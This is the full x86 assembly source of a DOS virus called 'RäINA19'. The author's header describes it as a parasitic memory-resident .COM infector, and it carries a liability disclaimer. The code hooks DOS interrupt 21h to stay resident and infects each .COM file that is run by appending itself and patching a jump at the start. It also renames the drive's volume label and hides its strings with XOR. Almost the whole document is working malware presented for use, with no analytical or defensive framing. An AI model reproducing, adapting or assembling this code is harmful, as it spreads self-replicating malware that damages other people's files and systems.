; name            :       (C)RäINA19
; author          :       rawswift
; type code       :       parasitic resident .COM infector
; symptoms        :       .COM file growth , changes drive's volume label
;
; DISCLAIMER: The author does not take any responsability for any damage,
; either direct or implied, caused by the usage or not of this source or of
; the resulting code after assembly. No warrant is made about the product
; functionability or quality.
;--------------------------------------------------------------------------------

model tiny
codeseg
startupcode

mayhem:

        jmp     virus_start

        db      0
        
virus_start:

        call    hell_yeah

hell_yeah:

        pop     bp
        sub     bp, offset hell_yeah

        cld

        mov     di, 0100h
        lea     si, [bp + offset _org_bytes]
        movsw
        movsb

        mov     ah, 1ah
        lea     dx, [bp + offset _data_transfer_area]
        int     21h

        mov     ax, 0f9f9h
        int     21h

        cmp     ax, '19'
        je      already_ressy

        mov     ax, ds
        dec     ax
        mov     es, ax

        mov     ax, ds:[2]
        sub     ax, (virus_end - virus_start) / 16 + 1

        mov     ds:[2], ax

        sub     word ptr es:[3], (virus_end - virus_start) / 16 + 1

        sub     ax, 16

        mov     es, ax
        mov     di, 0100h
        lea     si, [bp + di]
        mov     cx, (virus_end - virus_start) + 3
    rep movsb

        xor     ax, ax
        mov     ds, ax

        lds     bx, ds:[21h * 4]
        mov     word ptr es:[_org_int21hex_add_off], bx
        mov     word ptr es:[_org_int21hex_add_seg], ds

        mov     ds, ax
        mov     word ptr ds:[21h * 4], offset int21hex_handler
        mov     word ptr ds:[21h * 4 + 2], es

        jmp     do_host

already_ressy:

        call    set_int24hex_handler

        lea     di, [bp + offset _reina_19]
        lea     si, [bp + offset _reina]
        mov     cx, 6

        call    xor_loop

        lea     di, [bp + offset _data_transfer_area]
        lea     si, [bp + offset _drive]
        mov     cx, 4

        call    xor_loop

        mov     ah, 19h
        int     21h

        lea     si, [bp + offset _data_transfer_area]
        add     al, 65
        mov     [si], al
        
        mov     ah, 4eh
        mov     cx, 08h
        lea     dx, [bp + offset _data_transfer_area]
        int     21h

        jc      change_volume_label

        lea     si, [bp + offset _data_transfer_area + 1eh]
        lea     di, [bp + offset _reina_19]
        mov     cx, 8
   repe cmpsb

        je      restore_int24hex_add

        call    setup_fcb

        mov     al, '?'
        mov     cx, 11
    rep stosb

        mov     ah, 13h
        lea     dx, [bp + offset _data_transfer_area]         
        int     21h             

change_volume_label:

        call    setup_fcb  

        lea     si, [bp + offset _reina_19]
        mov     cx, 11       
    rep movsb

        mov     ah, 16h    
        lea     dx, [bp + offset _data_transfer_area]
        int     21h       

restore_int24hex_add:

        lea     dx, [bp + offset _org_int24hex_add]
        call    set_em_24hex

do_host:

        push    cs cs
        pop     ds es

        mov     ah, 1ah
        mov     dx, 0080h
        int     21h

        mov     di, 0100h
        push    di

        retn

  setup_fcb:

        lea     di, [bp + offset _data_transfer_area]

        mov     byte ptr [di], 0ffh

        mov     byte ptr [di + 6], 08h

        mov     byte ptr [di + 7], 00h

        add     di, 08h

        ret

  xor_loop:

        mov     ax, [si]
        xor     ax, 0ffffh
        stosw
        add     si, 2

        loop xor_loop

        ret

  set_int24hex_handler:

        push    es

        mov     ax, 3524h
        int     21h

        mov     [bp + offset _org_int24hex_add], bx
        mov     [bp + offset _org_int24hex_add + 2], es

        pop     es

        lea     dx, [bp + offset int24hex_handler]

  set_em_24hex:

        mov     ax, 2524h
        int     21h

        ret

        int21hex_handler:

                cmp     ax, 4b00h
                je      check_if_infected

                cmp     ax, 0f9f9h
                jne     do_org_int21hex

                mov     ax, '19'

                iret

        do_org_int21hex:

                                 db      0eah
        _org_int21hex_add_off    dw      ?
        _org_int21hex_add_seg    dw      ?

        check_if_infected:

                pushf
        push_a  db      60h

                push    ds
                push    cs
                pop     ds

                push    dx

                xor     bp, bp
                call    set_int24hex_handler

                pop     dx

                pop     ds

                xor     al, al
                call    f_attr

                push    cx

                xor     cx, cx
                call    set_f_attr

                mov     ax, 3d02h
                int     21h

                xchg    ax, bx

                push    ds
                push    dx

                push    cs
                pop     ds

                mov     ax, 5700h
                int     21h

                push    cx
                push    dx

                mov     ah, 3fh
                mov     cx, 3
                lea     dx, _org_bytes
                int     21h

                lea     si, _org_bytes
                cmp     word ptr [si], 'ZM'
                je      restore_em_all

                mov     ax, 4202h
                mov     cx, -1
                mov     dx, -2
                int     21h

                mov     ah, 3fh
                mov     cx, 2
                lea     dx, _word
                int     21h

                lea     si, _word
                cmp     word ptr [si], 0e9dfh
                je      restore_em_all

                call    f_pointer_end

                sub     ax, 3
                mov     word ptr [_jump_add], ax

                xor     al, al
                call    f_pointer

                mov     ah, 40h
                mov     cx, 3
                lea     dx, _jump_inst
                int     21h
        
                call    f_pointer_end

                mov     ah, 40h
                mov     cx, virus_end - virus_start
                lea     dx, virus_start
                int     21h

        restore_em_all:

                pop     dx
                pop     cx

                mov     ax, 5701h
                int     21h

                mov     ah, 3eh
                int     21h

                pop     dx
                pop     ds
                pop     cx

                call    set_f_attr

                push    ds
                push    cs
                pop     ds

                lea     dx, _org_int24hex_add
                call    set_em_24hex

                pop     ds

        pop_a   db      61h
                popf

                jmp     do_org_int21hex

        int24hex_handler:

                xor     al, al
                stc
                retf    2

        f_pointer_end:

                mov     al, 02h

        f_pointer:

                mov     ah, 42h
                xor     cx, cx
                xor     dx, dx
                int     21h
                ret

        set_f_attr:

                mov     al, 01h

        f_attr:

                mov     ah, 43h
                int     21h
                ret

                _org_bytes      db      0cdh, 20h, 00h
                _drive          db      'ÀÅ£ÕÑÕÿÿ'
                _reina          db      '­¶±¾ÎÆ ×¼Öß'
                                         
                                         

                _jump_inst      db      0e9h

virus_end:

        _jump_add             dw      ?  
        _org_int24hex_add     dd      ?
        _word                 dw      ?
        _reina_19             db      'RäINA19 (C)',20h
        _data_transfer_area   db      ?

                end     mayhem
